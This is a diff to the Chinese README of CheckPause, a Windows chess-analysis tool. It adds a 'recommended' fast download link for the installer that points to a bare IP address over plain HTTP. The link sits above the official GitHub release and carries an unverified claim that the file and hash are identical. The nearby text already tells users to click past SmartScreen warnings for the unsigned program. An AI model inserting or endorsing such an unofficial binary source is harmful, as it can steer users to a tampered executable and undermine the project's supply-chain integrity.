@@ -59,8 +59,9 @@ CheckPause 使用本地 Stockfish 评估每一步，再由任意 OpenAI 兼容�
 
 **最新版：CheckPause v1.7.0（Windows x64）**
 
-- 📦 [CheckPause_Setup_1.7.0.exe](https://github.com/Comet-zzz/CheckPause/releases/download/v1.7.0/CheckPause_Setup_1.7.0.exe)（114.5 MB，已内置 Stockfish、开局库、棋子资源与 Lichess 精选题集）
-- SHA-256：`5CA34298B9D1D328848FDCC5CE50AAE7EDACD1452167332D35855CDC020F9E3B`
+- 🚀 **国内加速下载（推荐）**：[CheckPause_Setup_1.7.0.exe](http://43.108.99.244/download/CheckPause_Setup_1.7.0.exe) — 同一份文件放在国内能稳定连上的服务器上，通常几十秒下完
+- 📦 [GitHub 下载](https://github.com/Comet-zzz/CheckPause/releases/download/v1.7.0/CheckPause_Setup_1.7.0.exe)（114.5 MB，已内置 Stockfish、开局库、棋子资源与 Lichess 精选题集）
+- SHA-256：`5CA34298B9D1D328848FDCC5CE50AAE7EDACD1452167332D35855CDC020F9E3B`（两个链接是同一个文件，哈希一致）
 - 双击运行安装包即可，安装后从桌面或开始菜单启动；程序未签名，若 Windows SmartScreen 提示，请选择「更多信息 → 仍要运行」。
 - 全部版本：https://github.com/Comet-zzz/CheckPause/releases
 
